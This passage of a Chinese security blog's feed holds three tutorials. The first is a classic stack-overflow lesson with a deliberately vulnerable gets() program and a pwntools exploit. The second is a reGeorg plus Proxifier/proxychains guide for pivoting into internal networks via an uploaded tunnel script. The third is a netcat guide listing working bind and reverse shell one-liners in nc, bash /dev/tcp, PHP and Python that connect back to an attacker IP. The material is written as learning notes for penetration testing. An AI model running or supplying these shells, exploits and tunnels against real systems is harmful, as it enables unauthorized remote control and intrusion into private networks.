    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;p&gt;看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>系统栈和经典栈溢出</title>
    <link href="http://bai-ren-1.github.io/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://bai-ren-1.github.io/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2019-11-30T04:39:05.000Z</published>
    <updated>2019-11-30T08:59:30.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="系统栈和经典栈溢出"><a href="#系统栈和经典栈溢出" class="headerlink" title="系统栈和经典栈溢出"></a>系统栈和经典栈溢出</h1><h3 id="寄存器ebp和esp"><a href="#寄存器ebp和esp" class="headerlink" title="寄存器ebp和esp"></a>寄存器ebp和esp</h3><ul><li><p>寄存器ebp指向  <u>当前的栈帧</u> 的底部（高地址）；</p></li><li><p>寄存器esp指向  <u> 当前的栈帧</u> 的顶部（低地址）；</p></li></ul><h3 id="函数栈帧"><a href="#函数栈帧" class="headerlink" title="函数栈帧"></a>函数栈帧</h3><ul><li>函数返回地址：函数调用前的指令位置；</li><li>栈帧状态值：保存前栈帧的顶部和底部（实际只保存前栈帧的底部，顶部可以通过堆栈平衡计算得出）；</li><li>局部变量：为函数局部变量开辟的内存空间；</li></ul><h3 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h3><ul><li>参数入栈：</li></ul><p>参数从右往左依次压入系统栈中；</p><ul><li>返回地址入栈：</li></ul><p>当前代码区调用的指令的下一条指令地址入栈（call中的压栈）；</p><ul><li>代码区跳转：</li></ul><p>处理器从当前代码区跳转到被调用函数的入口处（call中的跳转）；</p><ul><li>调整栈帧：</li></ul><p>保存当前栈帧状态值 –&gt; ebp入栈（push ebp）；</p><p>将当前栈帧切换到新栈帧 –&gt; esp装入ebp的值，更新栈帧底部 （mov ebp，esp）；</p><p>给新栈帧分配空间 –&gt; 把esp减少所需空间大小，抬高栈顶（sub esp,xxx）；</p><p>对应汇编（假设三个参数）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push 参数2</span><br><span class="line"></span><br><span class="line">push 参数1</span><br><span class="line"></span><br><span class="line">push 参数0  // 至此调用第一步压参数完成</span><br><span class="line"></span><br><span class="line">call 调用地址  // 同时完成第二步和第三步，把下一条指令的地址压栈并跳转</span><br><span class="line"></span><br><span class="line">push ebp  // 保存当前栈</span><br><span class="line"></span><br><span class="line">mov ebp,esp // 设置新栈帧的底部（切换栈帧）</span><br><span class="line"></span><br><span class="line">sub esp，空间大小  // 设置新栈帧的顶部（抬高栈帧）</span><br></pre></td></tr></table></figure><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/push%E5%8F%82%E6%95%B0.png" alt></p><p>上图完成了第一步，把三个参数都压入栈中</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/call.png" alt></p><p>上图完成了第二步和第三步。call操作把下一条指令的地址作为返回地址压入栈，eip跳转到代码区执行</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E4%BF%9D%E5%AD%98%E6%97%A7%E6%A0%88%E5%BA%95.png" alt></p><p>上图完成第四步中保存当前栈的操作，把当前栈的底部压入栈</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%9B%B4%E6%96%B0%E6%A0%88%E5%BA%95.png" alt></p><p>上图完成了第四步里面的更新栈底，把栈顶指针移动到当前栈的最上方</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%BC%80%E8%BE%9F%E7%A9%BA%E9%97%B4.png" alt></p><p>栈顶指针自减上移，开辟了新的栈帧空间。上图到此完成了函数调用过程，形成了上图这样的调用栈</p><ul><li>除了最后一张图，其他图中称ebp为 “当前栈底” 是因为当前还没有通过sub来开辟新的栈帧，所以现在还是处在当前栈帧内。而且现在呈现出来的当前栈的  “底部在头部” 的现象是因为，我们是把当前的栈底的值拿到了顶部进行保存（），而不是改变栈底为栈顶，当前栈 “底部” 依然处在底部；</li><li>最后一张图的 “前栈帧” 是针对刚新开辟的栈帧空间来说的（即图上标注“栈帧空间的部分”），此时的栈帧已经不是上一点注释中的那个了。而且我们能通过前栈帧的ebp（上一点注释中 “位于顶部” 的 “底部”）这个值，定位出前一个栈；</li></ul><blockquote><p>附上一张 x86 系统调用栈（注意下图的栈方向和上面的相反）</p></blockquote><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88.jpg" alt></p><h3 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们用以下gcc命令对程序进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example</span><br></pre></td></tr></table></figure><blockquote><p> m32 指的是生成 32 位程序； </p><p>-fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary；</p><p>关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有–enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数-no-pie；</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）； </p></blockquote><p>则目前该程序不开启canary （没有canary导致可以覆盖出栈的空间） 、开启了NX （堆栈不可执行，即使在堆栈中写入shellcode也不能执行）、不开启 PIE 和 ASLR （没有地址随机化，让我们能直接覆盖上success的地址）</p><p>然后我们跟进 vulneravle函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出其栈结构：</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%A0%88%E7%BB%93%E6%9E%84.png" alt></p><p>因为程序里面有shellcode的函数success，我们不需要自己注入shellcode（也因为开启了NX在栈注入shellcode也没用），直接溢出覆盖原返回地址为函数success的地址即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line"><span class="comment">##ida解析出的success的地址</span></span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行该EXP得到结果。</p><h3 id="一般栈溢出做法"><a href="#一般栈溢出做法" class="headerlink" title="一般栈溢出做法"></a>一般栈溢出做法</h3><h4 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h4><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><h4 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h4><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="noopener">stack buffer overflow</a></p><p><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3694.html</a></p><p><a href="https://www.cnblogs.com/rec0rd/p/7646857.html" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;系统栈和经典栈溢出&quot;&gt;&lt;a href=&quot;#系统栈和经典栈溢出&quot; class=&quot;headerlink&quot; title=&quot;系统栈和经典栈溢出&quot;&gt;&lt;/a&gt;系统栈和经典栈溢出&lt;/h1&gt;&lt;h3 id=&quot;寄存器ebp和esp&quot;&gt;&lt;a href=&quot;#寄存器ebp和esp&quot; cla
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透工具之reGeorg</title>
    <link href="http://bai-ren-1.github.io/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/"/>
    <id>http://bai-ren-1.github.io/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/</id>
    <published>2019-11-21T00:38:30.000Z</published>
    <updated>2019-11-27T11:06:16.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透工具之reGeorg-代理"><a href="#内网渗透工具之reGeorg-代理" class="headerlink" title="内网渗透工具之reGeorg+代理"></a>内网渗透工具之reGeorg+代理</h1><p>继续我们之前的学习，在我们渗透工作中，经常会出现一个服务器连接着两个网卡的情况：一个是连接外网的网卡，另一个是连接内网的网卡。我们的目标就是他连接着的内网，但我们却不能直接使用这台服务器去访问内网，因为上面缺少了我们必要的工具。为此，我们可以将这台服务器设置为我们访问内网的代理，作为跳板机打进内网</p><p>网络拓扑如下图：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.png" alt></p><p>为了打出这样一条隧道，我们可以通过使用 reGeorg+Proxifier/ reGeorg +Prochains 做到，无论是哪种组合，关于 reGeorg 的操作都是一样的，所以我们把两种组合的 reGeorg 都拿出来一起说，再分别介绍不同的两个代理</p><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>安装reGeorg的过程不再赘述，直接 git clone 到 kali 上，使用脚本的时候 cd 进目录就行</p><p>然后我们需要根据目标站点使用的语言上传相应版本的tunnel的脚本，埋下伏笔，上传成功的时候会显示“ 乔治说：看起来一切都很好 ”，哈哈，确实如此。</p><p>然后我们假设文件上传在根目录下，可以通过访问下面的网址： </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://站点的网址/<span class="title">tunnel.php</span></span></span><br></pre></td></tr></table></figure><p>访问到我们上去的隧道文件，只要我们看到下面这样的字眼，说明第一步成功了：</p><blockquote><p>Georg says, ‘All seems fine’</p></blockquote><p>然后我们再回去kali里面进行使用reGeorg的py脚本建立连接，打出一条隧道，使用命令如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://站点的网址/tunnel.php(上传reGeorg脚本的地址) -p <span class="number">8888</span>（任意没有服务冲突的端口）</span><br></pre></td></tr></table></figure><p>执行的界面如下：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E7%95%8C%E9%9D%A2.png" alt></p><p>到目前这一步就算做好了，下面的就是代理的操作了。</p><h2 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h2><p>下面我们开始介绍 Proxifier ，首先安装后打开。然后选择 Profile-proxy servers 设置代理地址和端口（这里选择的是本地端口8888的socks5代理：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/proxixier%E8%AE%BE%E7%BD%AE.png" alt></p><p>然后我们就得配置代理规则（代理规则其实就相当于指定那个软件的流量经过代理，哪些不经过代理）</p><p>一般情况下我们需要使用浏览器访问内网的网页，所以就需要给浏览器配置经过代理，其他不需要代理的软件就这设为direct模式（不经过代理）</p><p> 选择 Profile-proxification Rules，根据自己的需要配置：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E9%85%8D%E7%BD%AE%E8%A7%84%E5%88%99.png" alt></p><p>然后我们就可以愉快的使用了proxifier了：</p><blockquote><p>选择   右键 -&gt; Proxifier -&gt; Proxy SOCKS 5 127.0.0.1<br>范例：<br>mstsc远程桌面右键使用代理运行实现远控内网；<br>cmd右键使用代理运行实现例如nmap扫描内网等各种功能；</p></blockquote><h2 id="Proxychain-ng"><a href="#Proxychain-ng" class="headerlink" title="Proxychain-ng"></a>Proxychain-ng</h2><p>下面我们开始介绍Proxychain，首先介绍安装：</p><p>先 git clone 到本地，然后进行操作。先进入本地文件夹，然后 ./configure 运行配置文件。等配置完成之后就使用</p><p>make &amp;&amp; make install 进行 make 安装：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E5%AE%89%E8%A3%85proxychain.png" alt></p><p>等上述安装完成后,把当前目录下的配置文件 /src/proxychains.conf 复制到 /etc/proxychains.conf 里面，删除上一层生成的文件夹，然后至此暂时阶段性胜利：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E5%AE%89%E8%A3%85proxychain-1.png" alt></p><p>然后我们对 /etc/proxychains.conf 进行配置，这里使用vim：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br><span class="line">socks4 127.0.0.1 9050 //9050为你自己的端口，需要与reGeorg中设置的端口相同</span><br></pre></td></tr></table></figure><p>界面如下，我们配置sock4的配置信息，9050修改为你需要的端口（因为上面reGeorg使用了8888端口，把9050改为8888），然后保存退出：<img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E9%85%8D%E7%BD%AEproxychains%E7%AB%AF%E5%8F%A3.png" alt></p><p>最后我们就能愉快的通过如下命令使用 proxychains 了：</p><blockquote><p>在需要设置代理的软件前面加上proxychains，范例：<br>proxychains nmap<br>proxychains sqlmap </p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透工具之reGeorg-代理&quot;&gt;&lt;a href=&quot;#内网渗透工具之reGeorg-代理&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具之reGeorg+代理&quot;&gt;&lt;/a&gt;内网渗透工具之reGeorg+代理&lt;/h1&gt;&lt;p&gt;继续我们之前的学习，
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透工具之netcat</title>
    <link href="http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/"/>
    <id>http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/</id>
    <published>2019-11-18T08:30:46.000Z</published>
    <updated>2019-11-27T11:06:28.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透工具总结之netcat"><a href="#内网渗透工具总结之netcat" class="headerlink" title="内网渗透工具总结之netcat"></a>内网渗透工具总结之netcat</h1><p>继续上一篇的思路，继续学习总结内网穿透的工具。这次这个工具是也是老牌的工具，誉为瑞士军刀。不多逼逼直接学习他的使用</p><h2 id="nc反弹服务器shell"><a href="#nc反弹服务器shell" class="headerlink" title="nc反弹服务器shell"></a>nc反弹服务器shell</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>操作目标机将cmd /Bash shell 绑定到它的特定端口8888，再让攻击机用简单的nc命令连接到8888端口，从而使用目标机的shell服务</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB（Windows/Linux）</p><ul><li><p>在目标机上设置监听端口：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span> -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc -lvp <span class="number">8888</span> -e /bin/sh    [目标机为Linux]</span><br><span class="line"></span><br><span class="line">（<span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口）</span><br></pre></td></tr></table></figure></li><li><p>在攻击机上尝试连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 目标机的ip（ipB） <span class="number">8888</span></span><br></pre></td></tr></table></figure></li><li><p>连接成功之后就会在攻击机上得到远程目标机的shell</p></li></ul><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>攻击机监听它的特定端口8888，再操作目标机使用nc命令反向连接到8888端口，实现反弹shell</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB</p><ul><li>在攻击机上监听端口：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口</span><br></pre></td></tr></table></figure><ul><li>在目标机上尝试反向连接：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e /bin/sh    [目标机为Linux]</span><br></pre></td></tr></table></figure><ul><li>连接成功后会在攻击机上得到远程目标主机的shell</li></ul><h2 id="其他方式反弹shell-Linux服务器"><a href="#其他方式反弹shell-Linux服务器" class="headerlink" title="其他方式反弹shell(Linux服务器)"></a>其他方式反弹shell(Linux服务器)</h2><p>在上面反向连接中，需要目标机上装有netcat的服务，才能将服务器的shell反弹给攻击机。在很多时候，目标机上是没有该服务并且我们不能去上传或者下载到目标机上，那要如何让主机反弹shell呢？我们需要使用替代方法反向连接到攻击主机。</p><p>（注：下面无论哪种方式反弹shell都要先在自己的攻击机上开启端口监听，下面除了Bash反弹这个案例写了出来外，其他都默认用同样的方法在攻击机上用nc开启8888端口监听，然后我就不写出来了，特此说明（就是懒））</p><h3 id="Bash反向shell"><a href="#Bash反向shell" class="headerlink" title="Bash反向shell"></a>Bash反向shell</h3><p>同样在攻击机上监听8888端口等待服务器主动来反向连接</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后我们在目标机（Linux）的bash上执行下面的命令即可反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;＆/dev/tcp/192.168.100.113（攻击机ip）/4444 0&gt;＆1</span><br></pre></td></tr></table></figure><p>命令的解释：</p><ul><li>bash -i 是打开一个交互的bash </li><li>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp</li><li>0&gt;&amp;1 将标准输入重定向到标准输出中 </li></ul><blockquote><p>​    附上Linux中的文件描述符</p><ol><li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; </p></li><li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;</p></li></ol></blockquote><ul><li>在此处不论是 “0&gt;&amp;1” 或者 “0&lt;&amp;1”  都是将标准输入重定向到标准输出中； “&gt;&amp;” 和 “&amp;&gt;” 也是同样效果；</li></ul><h3 id="PHP反向shell"><a href="#PHP反向shell" class="headerlink" title="PHP反向shell"></a>PHP反向shell</h3><p>适用于目标机上存在php服务，绝大多数服务器上都会是这种情况。我们在目标机上执行下面命令以反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock = fsockopen("192.168.100.113（攻击机ip）"，8888);exec("/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="Python反向shell"><a href="#Python反向shell" class="headerlink" title="Python反向shell"></a>Python反向shell</h3><p>python不多说了，几乎每台机器都有。在目标机上用一下命令反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.113",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p = subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><p>还有更多的姿势会在后面补充。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;a href=&quot;#内网渗透工具总结之netcat&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;/a&gt;内网渗透工具总结之netcat&lt;/h1&gt;&lt;p&gt;继续上一篇的思路，继续学习总结内网穿
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
</feed>
